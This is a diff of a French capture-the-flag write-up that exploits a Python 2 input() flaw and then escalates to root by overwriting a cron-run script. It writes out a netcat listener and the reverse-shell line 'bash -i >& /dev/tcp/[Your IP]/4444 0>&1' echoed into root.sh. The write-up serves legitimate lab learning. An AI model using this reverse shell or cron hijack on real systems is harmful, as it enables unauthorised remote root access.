@@ -32,12 +32,12 @@ nc [IP] 10000
 >On voit aussi que le module input est utilisé.
 
 
-**NameError: name 'a' is not defined
+**NameError: name 'a' is not defined**
 
 On a l'exception suivante si on entre une lettre.
 >Ce qui veut dire que python n'a pas pu identifier la variable ou le module "a" : On a donc pas définit une varibale ou un module de nom de "a"
 
-**Il s'agit d'une vulnérabilité de python2 qui permet d'exécuter des codes sur la machine via python.
+**Il s'agit d'une vulnérabilité de python2 qui permet d'exécuter des codes sur la machine via python.**
 
 # Deuxième étape : exploitation de vulnérabilité
 
@@ -56,7 +56,7 @@ On est mainténant loggé sur le user king.
 ```bash
 cat user.txt
 ```
-Avec la commande ci-dessus on a le premier flag.
+**Avec la commande ci-dessus on a le premier flag.**
 
 
 # Troisième étape : Escalade de privilège
@@ -64,24 +64,26 @@ Avec la commande ci-dessus on a le premier flag.
 
 ![](img/Develpy_nc_id.png?raw=true)
 
+On est bien sur l'user king.
+
 ![](img/Develpy_nc_cron.png?raw=true)
 
 Le fichier root.sh est executé à tout moment par le cron en root.
 En modifiant son contenu on pourra donc exécuter un script pour se connecter au shell root.
 Quand ça serra fait on aurra accès au root.
 
-Démarrons une connexion en écoute(listener) sur notre terminal locale.
-```
+Démarrons une connexion en écoute(listener) sur notre terminal locale(machine de l'attaquant).
+```bash
 nc -l -vv -p 4444
 ```
 4444 est le port que j'ai utilisé,vous pouvez le changer.
 
 Supprimer le fichier root.sh.
 
-Executer la commande ci-dessous pour établir la connection.
+Executer la commande ci-dessous pour recréer le fichier root avec le contenu **bash -i >& /dev/tcp/[Your IP]/4444 0>&1** afin d'établir la connection.
 
 ```bash
-echo "bash -i >& /dev/tcp/[Your IP]/4444 0>&1" >
+echo "bash -i >& /dev/tcp/[Your IP]/4444 0>&1" > root.sh
 
 ```
 
@@ -89,4 +91,4 @@ Après ça,une fois que le script serras réexécuter par le cron on aurra accè
 
 ![](img/Develpy_nc_root.png?raw=true)
 
->Avec un cat /root/root.txt on a le flag
+**Avec un   cat    /root/root.txt   on a le flag**
